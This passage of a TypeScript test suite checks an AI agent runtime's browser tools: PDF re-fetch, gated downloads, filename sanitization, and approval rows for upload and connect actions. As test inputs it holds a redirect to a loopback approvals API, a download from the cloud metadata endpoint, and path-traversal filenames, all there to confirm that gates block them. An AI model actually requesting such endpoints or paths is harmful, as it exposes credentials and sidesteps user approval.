    const fetchedUrls: string[] = [];
    browserTest.setPdfRefetchFetchForTest(async (url) => {
      fetchedUrls.push(url);
      if (url === PDF_URL) {
        return new Response(null, { status: 302, headers: { location: REDIRECT_TARGET } });
      }
      return new Response(new TextEncoder().encode("%PDF-1.4 real bytes"), { status: 200 });
    });
    browserTest.installFakeSessionWithPageForTest("pdf-redirect-ok", makePdfPage({
      body: async () => {
        throw new Error("intercepted");
      }
    }));

    const raw = await browserNavigate("pdf-redirect-ok", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; pdfText?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.pdfText).toBe("extracted:19");
    expect(fetchedUrls).toEqual([PDF_URL, REDIRECT_TARGET]);
  });

  test("aborts the re-fetch when a redirect hop targets a blocked host", async () => {
    // A redirect must never reach a host the navigation gates block —
    // the loopback target here would expose the runtime's own API.
    let extractorCalls = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "should not run" };
    });
    const fetchedUrls: string[] = [];
    browserTest.setPdfRefetchFetchForTest(async (url) => {
      fetchedUrls.push(url);
      return new Response(null, { status: 302, headers: { location: "http://127.0.0.1:8787/api/runtime/approvals" } });
    });
    browserTest.installFakeSessionWithPageForTest("pdf-redirect-blocked", makePdfPage({
      body: async () => {
        throw new Error("intercepted");
      }
    }));

    const raw = await browserNavigate("pdf-redirect-blocked", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.note).toContain("could not retrieve PDF bytes");
    // The blocked hop was never requested.
    expect(fetchedUrls).toEqual([PDF_URL]);
    expect(extractorCalls).toBe(0);
  });

  test("notes that the bytes could not be retrieved when body and re-fetch both return HTML", async () => {
    let extractorCalls = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "should not run" };
    });
    browserTest.setPdfRefetchFetchForTest(async () =>
      new Response(new TextEncoder().encode("<!DOCTYPE html><html><body>error page</body></html>"), { status: 200 }));
    browserTest.installFakeSessionWithPageForTest("pdf-html-twice", makePdfPage({
      body: async () => new TextEncoder().encode("<!DOCTYPE html><html><body>viewer</body></html>")
    }));

    const raw = await browserNavigate("pdf-html-twice", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.note).toContain("could not retrieve PDF bytes");
    expect(extractorCalls).toBe(0);
  });

  test("does not re-fetch when the response body is already valid PDF bytes", async () => {
    browserTest.setPdfTextExtractorForTest(async (bytes) => ({ text: `extracted:${bytes.byteLength}` }));
    let fetchCalls = 0;
    browserTest.setPdfRefetchFetchForTest(async () => {
      fetchCalls++;
      return new Response(new TextEncoder().encode("%PDF-1.4 should not be fetched"), { status: 200 });
    });
    browserTest.installFakeSessionWithPageForTest("pdf-no-refetch", makePdfPage({
      body: async () => new TextEncoder().encode("%PDF-1.4 direct bytes")
    }));

    const raw = await browserNavigate("pdf-no-refetch", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdfText?: string };
    expect(parsed.success).toBe(true);
    // "%PDF-1.4 direct bytes" = 21 — the body() bytes, not the re-fetch.
    expect(parsed.pdfText).toBe("extracted:21");
    expect(fetchCalls).toBe(0);
  });

  test("notes that the PDF bytes could not be retrieved when both body and re-fetch fail", async () => {
    // A rejecting fetch (network error / AbortSignal timeout) must
    // degrade to the honest note — never crash the process.
    let extractorCalls = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "should not run" };
    });
    browserTest.setPdfRefetchFetchForTest(async () => {
      throw new Error("The operation timed out");
    });
    browserTest.installFakeSessionWithPageForTest("pdf-no-bytes", makePdfPage({
      body: async () => {
        throw new Error("intercepted");
      }
    }));

    const raw = await browserNavigate("pdf-no-bytes", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.note).toContain("could not retrieve PDF bytes");
    expect(parsed.note).toContain("do not re-snapshot");
    expect(extractorCalls).toBe(0);
  });

  test("enforces the byte cap on re-fetched bytes via content-length before buffering", async () => {
    let extractorCalls = 0;
    let bodyReads = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "should not run" };
    });
    browserTest.setPdfExtractMaxBytesForTest(8);
    // A minimal Response-shaped fake: a real Response buffers its body at
    // construction, which would hide whether the cap short-circuited the
    // arrayBuffer() read.
    browserTest.setPdfRefetchFetchForTest(async () => ({
      status: 200,
      headers: new Headers({ "content-length": "100" }),
      arrayBuffer: async () => {
        bodyReads++;
        return new Uint8Array(100).buffer;
      }
    }) as unknown as Response);
    browserTest.installFakeSessionWithPageForTest("pdf-refetch-cap", makePdfPage({
      body: async () => {
        throw new Error("intercepted");
      }
    }));

    const raw = await browserNavigate("pdf-refetch-cap", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; note?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBe(true);
    expect(parsed.note).toContain("extraction cap");
    expect(bodyReads).toBe(0);
    expect(extractorCalls).toBe(0);
  });

  test("non-PDF responses keep the normal snapshot path", async () => {
    let extractorCalls = 0;
    browserTest.setPdfTextExtractorForTest(async () => {
      extractorCalls++;
      return { text: "nope" };
    });
    browserTest.installFakeSessionWithPageForTest("pdf-not", makePdfPage({ contentType: "text/html; charset=utf-8" }));

    const raw = await browserNavigate("pdf-not", { url: PDF_URL });
    const parsed = JSON.parse(raw) as { success: boolean; pdf?: boolean; snapshot?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.pdf).toBeUndefined();
    expect(typeof parsed.snapshot).toBe("string");
    expect(extractorCalls).toBe(0);
  });
});

// Approved-download executor. Mirrors the upload suite: fake session +
// fake page whose waitForEvent hands back a stubbed Playwright Download,
// so save-path, sanitization, collision, and size-cap behavior run
// without Chromium.
describe("browserDownloadApproved", () => {
  const DL_ROOT = "/tmp/gini-browser-download-tests";
  let prevStateRoot: string | undefined;

  const downloadsDirFor = (instance: string) => join(DL_ROOT, "instances", instance, "downloads");

  beforeEach(() => {
    prevStateRoot = process.env.GINI_STATE_ROOT;
    process.env.GINI_STATE_ROOT = DL_ROOT;
    rmSync(DL_ROOT, { recursive: true, force: true });
  });

  afterEach(() => {
    browserTest.clearFakeSessionsForTest();
    browserTest.setInFlightDisconnectsForTest(0);
    browserTest.setDownloadMaxBytesForTest(null);
    browserTest.setDownloadEventTimeoutForTest(null);
    if (prevStateRoot === undefined) delete process.env.GINI_STATE_ROOT;
    else process.env.GINI_STATE_ROOT = prevStateRoot;
    rmSync(DL_ROOT, { recursive: true, force: true });
  });

  // Build a fake page + ref'd locator wired so a click resolves the
  // download promise with a stubbed Download.
  function installDownloadSession(
    taskId: string,
    download: {
      suggestedFilename: () => string;
      saveAs: (p: string) => Promise<void>;
      url?: () => string;
      cancel?: () => Promise<void>;
    },
    opts: { clickThrows?: boolean } = {}
  ): { clicks: () => number } {
    let clicks = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      waitForEvent: (() => Promise.resolve(download)) as unknown as import("playwright-core").Page["waitForEvent"]
    };
    browserTest.installFakeSessionWithPageForTest(taskId, fakePage);
    const loc = {
      click: async () => {
        if (opts.clickThrows) throw new Error("click failed: element detached");
        clicks++;
      }
    };
    const refs = new Map<string, unknown>();
    refs.set("@e2", loc);
    browserTest.setFakeSessionRefsForTest(taskId, refs);
    return { clicks: () => clicks };
  }

  test("clicks the ref, saves under the instance downloads dir, and reports path/size/suggested filename", async () => {
    const download = {
      url: () => "https://cdn.example.com/files/invoice.pdf",
      suggestedFilename: () => "invoice.pdf",
      saveAs: async (p: string) => writeFileSync(p, "PDF-BYTES")
    };
    const counter = installDownloadSession("dl-ok", download);

    const raw = await browserDownloadApproved("dl-ok", "@e2", "dl-ok-inst");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string; size?: number; suggestedFilename?: string; downloadUrl?: string };
    expect(parsed.success).toBe(true);
    expect(counter.clicks()).toBe(1);
    expect(parsed.path).toBe(join(downloadsDirFor("dl-ok-inst"), "invoice.pdf"));
    expect(parsed.size).toBe("PDF-BYTES".length);
    expect(parsed.suggestedFilename).toBe("invoice.pdf");
    // The real source the bytes came from rides the result for the audit row.
    expect(parsed.downloadUrl).toBe("https://cdn.example.com/files/invoice.pdf");
    expect(existsSync(parsed.path!)).toBe(true);
  });

  test("blocks a download whose source URL fails the SSRF gate, cancelling before any save", async () => {
    let cancelled = 0;
    let saved = 0;
    const download = {
      // The page URL is allowed; the element's actual download source
      // resolves to the cloud metadata endpoint — the gate must check the
      // SOURCE, not the page.
      url: () => "http://169.254.169.254/latest/meta-data/iam",
      suggestedFilename: () => "meta.txt",
      saveAs: async (p: string) => {
        saved++;
        writeFileSync(p, "x");
      },
      cancel: async () => {
        cancelled++;
      }
    };
    installDownloadSession("dl-ssrf", download);

    const raw = await browserDownloadApproved("dl-ssrf", "@e2", "dl-ssrf-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("download source URL");
    expect(cancelled).toBe(1);
    expect(saved).toBe(0);
    expect(existsSync(downloadsDirFor("dl-ssrf-inst"))).toBe(false);
  });

  test("saves a client-generated blob: download without gating its source", async () => {
    // A blob: URL is the page exporting bytes it already holds (the
    // common "export CSV" anchor) — no network fetch happens, so the
    // SSRF/domain gate must not cancel it.
    let cancelled = 0;
    const download = {
      url: () => "blob:https://portal.example.com/3f0a8a44-1c2e-4f0b-9d52-aaaa00001111",
      suggestedFilename: () => "export.csv",
      saveAs: async (p: string) => writeFileSync(p, "a,b\n1,2"),
      cancel: async () => {
        cancelled++;
      }
    };
    installDownloadSession("dl-blob", download);

    const raw = await browserDownloadApproved("dl-blob", "@e2", "dl-blob-inst");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string; downloadUrl?: string };
    expect(parsed.success).toBe(true);
    expect(cancelled).toBe(0);
    expect(parsed.path).toBe(join(downloadsDirFor("dl-blob-inst"), "export.csv"));
    expect(parsed.downloadUrl).toBe("blob:https://portal.example.com/3f0a8a44-1c2e-4f0b-9d52-aaaa00001111");
    expect(existsSync(parsed.path!)).toBe(true);
  });

  test("sanitizes a traversal-laden suggested filename down to its basename", async () => {
    const download = {
      suggestedFilename: () => "../../../etc/evil.sh",
      saveAs: async (p: string) => writeFileSync(p, "x")
    };
    installDownloadSession("dl-traversal", download);

    const raw = await browserDownloadApproved("dl-traversal", "@e2", "dl-traversal-inst");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
    expect(parsed.success).toBe(true);
    // Saved INSIDE the downloads dir under the stripped basename — the
    // traversal segments must not escape the directory.
    expect(parsed.path).toBe(join(downloadsDirFor("dl-traversal-inst"), "evil.sh"));
  });

  test("unique-ifies the save path when the filename already exists", async () => {
    const dir = downloadsDirFor("dl-collide-inst");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "report.pdf"), "earlier");
    const download = {
      suggestedFilename: () => "report.pdf",
      saveAs: async (p: string) => writeFileSync(p, "newer")
    };
    installDownloadSession("dl-collide", download);

    const raw = await browserDownloadApproved("dl-collide", "@e2", "dl-collide-inst");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
    expect(parsed.success).toBe(true);
    expect(parsed.path).toBe(join(dir, "report-1.pdf"));
    // The earlier file is untouched.
    expect(existsSync(join(dir, "report.pdf"))).toBe(true);
  });

  test("rejects and deletes a download over the size cap", async () => {
    browserTest.setDownloadMaxBytesForTest(4);
    const download = {
      suggestedFilename: () => "huge.bin",
      saveAs: async (p: string) => writeFileSync(p, "way more than four bytes")
    };
    installDownloadSession("dl-cap", download);

    const raw = await browserDownloadApproved("dl-cap", "@e2", "dl-cap-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toMatch(/size cap/);
    expect(existsSync(join(downloadsDirFor("dl-cap-inst"), "huge.bin"))).toBe(false);
  });

  test("fails loudly on an unknown ref without self-healing", async () => {
    // The page exposes getByRole/getByText (the healing surface) — the
    // approved-download path must NOT consult them. Trust boundary: the
    // approval named the exact stamped element (see ADR
    // browser-fill-secret.md).
    let healingQueried = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      waitForEvent: (() => new Promise(() => undefined)) as unknown as import("playwright-core").Page["waitForEvent"],
      getByRole: () => {
        healingQueried++;
        return { nth: () => ({ count: async () => 1 }) };
      },
      getByText: () => {
        healingQueried++;
        return { nth: () => ({ count: async () => 1 }) };
      }
    } as unknown as Partial<import("playwright-core").Page>;
    browserTest.installFakeSessionWithPageForTest("dl-bad-ref", fakePage);

    const raw = await browserDownloadApproved("dl-bad-ref", "@e99", "dl-bad-ref-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("Unknown ref @e99");
    expect(healingQueried).toBe(0);
  });

  test("fails fast with snapshot guidance when the stamped element vanished (count 0)", async () => {
    // The stamp can be destroyed between approval and execution — the
    // common case is downloading from a row menu that closed after the
    // previous download. The pre-check must fail immediately with
    // actionable guidance instead of hanging 10s in the click and
    // surfacing a raw Playwright timeout. Still no self-healing: the
    // no-heal trust boundary stands (see ADR browser-fill-secret.md).
    let clicks = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      waitForEvent: (() => new Promise(() => undefined)) as unknown as import("playwright-core").Page["waitForEvent"]
    };
    browserTest.installFakeSessionWithPageForTest("dl-stale", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e2", {
      count: async () => 0,
      click: async () => {
        clicks++;
      }
    });
    browserTest.setFakeSessionRefsForTest("dl-stale", refs);

    const raw = await browserDownloadApproved("dl-stale", "@e2", "dl-stale-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("no longer on the page");
    expect(parsed.error).toContain("browser_snapshot");
    // Must never have reached the click.
    expect(clicks).toBe(0);
  });

  test("a count() that throws reads as a lost stamp and fails fast", async () => {
    let clicks = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      waitForEvent: (() => new Promise(() => undefined)) as unknown as import("playwright-core").Page["waitForEvent"]
    };
    browserTest.installFakeSessionWithPageForTest("dl-count-throw", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e2", {
      count: async () => {
        throw new Error("Execution context was destroyed");
      },
      click: async () => {
        clicks++;
      }
    });
    browserTest.setFakeSessionRefsForTest("dl-count-throw", refs);

    const raw = await browserDownloadApproved("dl-count-throw", "@e2", "dl-count-throw-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("no longer on the page");
    expect(clicks).toBe(0);
  });

  test("a live stamped element (count > 0) proceeds to the click and save", async () => {
    const download = {
      suggestedFilename: () => "live.pdf",
      saveAs: async (p: string) => writeFileSync(p, "x")
    };
    let clicks = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      waitForEvent: (() => Promise.resolve(download)) as unknown as import("playwright-core").Page["waitForEvent"]
    };
    browserTest.installFakeSessionWithPageForTest("dl-live", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e2", {
      count: async () => 1,
      click: async () => {
        clicks++;
      }
    });
    browserTest.setFakeSessionRefsForTest("dl-live", refs);

    const raw = await browserDownloadApproved("dl-live", "@e2", "dl-live-inst");
    const parsed = JSON.parse(raw) as { success: boolean; path?: string };
    expect(parsed.success).toBe(true);
    expect(clicks).toBe(1);
    expect(parsed.path).toBe(join(downloadsDirFor("dl-live-inst"), "live.pdf"));
  });

  test("fails with a browser_navigate steer when the click never triggers a download", async () => {
    // Inline-rendering links (Chrome opens PDFs in its viewer) never fire
    // the download event, so the wait times out. The failure must tell
    // the model to reach inline content via browser_navigate instead.
    browserTest.setDownloadEventTimeoutForTest(25);
    let clicks = 0;
    const fakePage = {
      ...makeFakePageForRefTools("https://portal.example.com/invoices"),
      // Honors the injected timeout: rejects like Playwright's
      // TimeoutError when no download event arrives in time.
      waitForEvent: ((_event: string, opts?: { timeout?: number }) =>
        new Promise((_, reject) =>
          setTimeout(
            () => reject(new Error(`Timeout ${opts?.timeout}ms exceeded while waiting for event "download"`)),
            opts?.timeout ?? 0
          )
        )) as unknown as import("playwright-core").Page["waitForEvent"]
    };
    browserTest.installFakeSessionWithPageForTest("dl-timeout", fakePage);
    const refs = new Map<string, unknown>();
    refs.set("@e2", {
      click: async () => {
        clicks++;
      }
    });
    browserTest.setFakeSessionRefsForTest("dl-timeout", refs);

    const raw = await browserDownloadApproved("dl-timeout", "@e2", "dl-timeout-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(clicks).toBe(1);
    expect(parsed.error).toContain("did not trigger a file download");
    expect(parsed.error).toContain("browser_navigate");
  });

  test("surfaces a click failure as the tool error", async () => {
    const download = {
      suggestedFilename: () => "never.pdf",
      saveAs: async () => undefined
    };
    installDownloadSession("dl-click-fail", download, { clickThrows: true });

    const raw = await browserDownloadApproved("dl-click-fail", "@e2", "dl-click-fail-inst");
    const parsed = JSON.parse(raw) as { success: boolean; error?: string };
    expect(parsed.success).toBe(false);
    expect(parsed.error).toContain("click failed");
  });
});

describe("sanitizeDownloadFilename", () => {
  test("keeps a plain filename", () => {
    expect(sanitizeDownloadFilename("invoice.pdf")).toBe("invoice.pdf");
  });

  test("strips directories and traversal (slash and backslash)", () => {
    expect(sanitizeDownloadFilename("../../etc/passwd")).toBe("passwd");
    expect(sanitizeDownloadFilename("..\\..\\evil.exe")).toBe("evil.exe");
  });

  test("falls back to 'download' for empty and dot-only names", () => {
    expect(sanitizeDownloadFilename("")).toBe("download");
    expect(sanitizeDownloadFilename(".")).toBe("download");
    expect(sanitizeDownloadFilename("..")).toBe("download");
    expect(sanitizeDownloadFilename("a/b/")).toBe("download");
  });

  test("removes control characters", () => {
    expect(sanitizeDownloadFilename("re\x00port\x1f.pdf")).toBe("report.pdf");
  });
});

// browser_upload_file dispatched through the chat-task tool dispatcher must
// route through the approval gate (file egress is irreversible from the
// user's perspective and gets a high-risk row, same as file_write).
describe("dispatchToolCall(browser_upload_file)", () => {
  const ROOT = "/tmp/gini-browser-upload-dispatch-tests";
  const WORKSPACE = join(ROOT, "workspace");

  function dispatchConfig(instance: string): RuntimeConfig {
    process.env.GINI_STATE_ROOT = ROOT;
    process.env.GINI_LOG_ROOT = `${ROOT}-logs`;
    rmSync(`${ROOT}/instances/${instance}`, { recursive: true, force: true });
    return {
      instance,
      port: 7339,
      token: "test-token",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: WORKSPACE,
      stateRoot: `${ROOT}/instances/${instance}`,
      logRoot: `${ROOT}-logs/${instance}`,
      // The test asserts the gated path (kind: "pending"). Force
      // strict so the new default-auto policy doesn't auto-resolve
      // the upload approval.
      approvalMode: "strict"
    };
  }

  test("returns kind:'pending' with an approval row at risk 'high'", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    writeFileSync(join(WORKSPACE, "report.txt"), "hello upload\n");
    const config = dispatchConfig("browser-upload-dispatch");
    // The dispatcher needs a real task row to attach the approval to.
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "upload test", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });

    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_upload_file",
      "call_upload_1",
      JSON.stringify({ ref: "@e3", path: "report.txt" })
    );
    expect(result.kind).toBe("pending");

    const state = readState(config.instance);
    const approval = state.authorizations.find((a) =>
      result.kind === "pending" && a.id === result.approvalId
    );
    expect(approval).toBeDefined();
    expect(approval!.risk).toBe("high");
    expect(approval!.action).toBe("browser.upload_file");
    expect(approval!.target).toBe("report.txt");
    // Approval payload carries enough for the executor to act without
    // re-walking the workspace.
    expect(approval!.payload.ref).toBe("@e3");
    expect(approval!.payload.path).toBe("report.txt");
    expect(typeof approval!.payload.resolvedPath).toBe("string");
    expect(String(approval!.payload.resolvedPath).endsWith("/report.txt")).toBe(true);
    expect(approval!.payload.toolCallId).toBe("call_upload_1");

    rmSync(ROOT, { recursive: true, force: true });
  });

  test("propagates outside-workspace path errors instead of opening an approval", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-upload-dispatch-escape");
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "upload escape", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });

    await expect(
      dispatchToolCall(
        config,
        taskId,
        "browser_upload_file",
        "call_upload_escape_1",
        JSON.stringify({ ref: "@e1", path: "../escape.txt" })
      )
    ).rejects.toThrow(/outside workspace/);
    // No approval row should exist.
    const state = readState(config.instance);
    expect(state.authorizations.length).toBe(0);

    rmSync(ROOT, { recursive: true, force: true });
  });
});

// browser_connect dispatched through the chat-task tool dispatcher must
// route through the approval gate (spawning a visible Chrome with a
// per-instance profile is a trust-establishment moment that always
// warrants explicit user consent under "auto" mode; only "yolo" auto-
// approves and "strict" gates everything).
describe("dispatchToolCall(browser_connect)", () => {
  const ROOT = "/tmp/gini-browser-connect-dispatch-tests";
  const WORKSPACE = join(ROOT, "workspace");

  function dispatchConfig(instance: string): RuntimeConfig {
    process.env.GINI_STATE_ROOT = ROOT;
    process.env.GINI_LOG_ROOT = `${ROOT}-logs`;
    rmSync(`${ROOT}/instances/${instance}`, { recursive: true, force: true });
    return {
      instance,
      port: 7339,
      token: "test-token",
      provider: { name: "echo", model: "gini-echo-v0" },
      workspaceRoot: WORKSPACE,
      stateRoot: `${ROOT}/instances/${instance}`,
      logRoot: `${ROOT}-logs/${instance}`,
      // Default ("auto") mode is the user-facing default. The policy
      // seam routes browser.connect through gate under auto, so this
      // is the expected production shape — no override needed.
      approvalMode: "auto"
    };
  }

  afterEach(() => {
    // Drop any fake session a test installed so the navigate-first
    // precondition can't leak across tests.
    browserTest.clearFakeSessionsForTest();
  });

  test("returns kind:'pending' with an approval row at risk 'medium' and action 'browser.connect'", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect test chat");
      const task = createTask(state.instance, "connect test", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    // browser_connect now requires an already-open page (it only clears a
    // sign-in wall the agent already hit), so seed a live session.
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://console.cloud.google.com/welcome",
      close: () => Promise.resolve()
    });

    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_connect_1",
      JSON.stringify({ reason: "Sign in to Google Cloud Console" })
    );
    expect(result.kind).toBe("pending");

    const state = readState(config.instance);
    const approval = state.setupRequests.find((a) =>
      result.kind === "pending" && a.id === result.approvalId
    );
    expect(approval).toBeDefined();
    expect(approval!.action).toBe("browser.connect");
    // The reason flows onto the setup-request target so the UI surfaces it
    // prominently in the setup card.
    expect(approval!.target).toBe("Sign in to Google Cloud Console");
    expect(approval!.payload.reason).toBe("Sign in to Google Cloud Console");
    expect(approval!.payload.toolCallId).toBe("call_connect_1");

    rmSync(ROOT, { recursive: true, force: true });
  });

  test("on the cdp transport, refuses to mint a Connect card and steers to the user's own Chrome", async () => {
    // The Connect card's screencast streams the SPAWNED headless Chrome; when
    // the user has attached their own Chrome over CDP there's nothing to
    // screencast, so a card would 409 on open and strand them. The dispatch
    // must short-circuit with a sync ok:false steer instead of minting a card.
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-cdp");
    const taskId = await mutateState(config.instance, (state) => {
      const session = createChatSession(state, "connect on cdp chat");
      const task = createTask(state.instance, "connect on cdp", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      // A live cdp attach record makes the active transport "cdp".
      state.browser = { mode: "cdp", cdpUrl: "ws://127.0.0.1:9222/devtools/browser/abc", startedAt: new Date().toISOString() };
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://example.com/login",
      close: () => Promise.resolve()
    });
    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_connect_cdp",
      JSON.stringify({ reason: "Sign in" })
    );
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error?: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toMatch(/attached their own Chrome over CDP/i);
    // No Connect card was minted.
    expect(readState(config.instance).setupRequests.filter((s) => s.action === "browser.connect").length).toBe(0);
    rmSync(ROOT, { recursive: true, force: true });
  });

  test("refuses (no card) on a sessionless task — the screencast needs a web chat session", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-sessionless");
    const taskId = await mutateState(config.instance, (state) => {
      // No chatSessionId — a subagent / scheduled-job / headless run.
      const task = createTask(state.instance, "connect sessionless", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://example.com/login",
      close: () => Promise.resolve()
    });
    const result = await dispatchToolCall(config, taskId, "browser_connect", "call_sessionless", JSON.stringify({ reason: "Sign in" }));
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error?: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toMatch(/needs a live web chat session/i);
    expect(readState(config.instance).setupRequests.filter((s) => s.action === "browser.connect").length).toBe(0);
    rmSync(ROOT, { recursive: true, force: true });
  });

  test("refuses (no card) on a job-origin session — a scheduled job can't show the card", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-job");
    const taskId = await mutateState(config.instance, (state) => {
      // A dedicated job-spawned session IS a session, but origin "job" means no
      // web card was ever rendered — minting one would park the job forever.
      const session = createChatSession(state, "job chat", undefined, undefined, "job");
      const task = createTask(state.instance, "connect job", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://example.com/login",
      close: () => Promise.resolve()
    });
    const result = await dispatchToolCall(config, taskId, "browser_connect", "call_job", JSON.stringify({ reason: "Sign in" }));
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error?: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toMatch(/needs a live web chat session/i);
    expect(readState(config.instance).setupRequests.filter((s) => s.action === "browser.connect").length).toBe(0);
    rmSync(ROOT, { recursive: true, force: true });
  });

  test("refuses (no card) when the conversation is over a messaging bridge (telegram)", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-telegram");
    const taskId = await mutateState(config.instance, (state) => {
      // A Telegram-sourced chat session can't render or complete the screencast card.
      const session = createChatSession(state, "tg chat", { kind: "telegram", bridgeId: "bridge_1", chatId: 7, target: "7" });
      const task = createTask(state.instance, "connect tg", undefined, undefined, undefined, undefined, undefined, session.id);
      upsertTask(state, task);
      return task.id;
    });
    browserTest.installFakeSessionWithPageForTest(taskId, {
      url: () => "https://example.com/login",
      close: () => Promise.resolve()
    });
    const result = await dispatchToolCall(config, taskId, "browser_connect", "call_tg", JSON.stringify({ reason: "Sign in" }));
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error?: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toMatch(/over telegram/i);
    expect(readState(config.instance).setupRequests.filter((s) => s.action === "browser.connect").length).toBe(0);
    rmSync(ROOT, { recursive: true, force: true });
  });

  test("missing reason returns a recoverable nudge without creating an approval row", async () => {
    rmSync(ROOT, { recursive: true, force: true });
    mkdirSync(WORKSPACE, { recursive: true });
    const config = dispatchConfig("browser-connect-dispatch-missing-reason");
    const taskId = await mutateState(config.instance, (state) => {
      const task = createTask(state.instance, "connect missing reason", undefined, undefined, undefined, undefined);
      upsertTask(state, task);
      return task.id;
    });

    // Issue #397: a missing `reason` must NOT throw a bare "Missing required
    // string argument" — that surfaced as a terse tool error and stalled the
    // flow. Instead it returns a recoverable sync nudge so the model simply
    // re-calls WITH a reason. The reason guard runs before the navigate-first
    // guard, so an empty-arg call hits it first.
    const result = await dispatchToolCall(
      config,
      taskId,
      "browser_connect",
      "call_connect_missing_1",
      JSON.stringify({})
    );
    expect(result.kind).toBe("sync");
    if (result.kind !== "sync") throw new Error("unreachable");
    const parsed = JSON.parse(result.result) as { ok: boolean; error: string };
    expect(parsed.ok).toBe(false);
    expect(parsed.error).toContain("requires a `reason`");
